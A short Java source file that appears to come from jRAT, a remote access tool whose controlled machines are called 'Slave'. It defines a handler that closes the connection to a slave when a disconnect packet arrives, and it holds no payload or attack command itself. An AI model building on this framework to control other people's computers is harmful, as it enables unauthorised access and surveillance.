package io.jrat.client.packets.incoming;

import io.jrat.client.Slave;
import io.jrat.client.exceptions.CloseException;

import java.io.DataInputStream;


public class Packet12Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		slave.closeSocket(new CloseException("Disconnect packet"));
	}

}
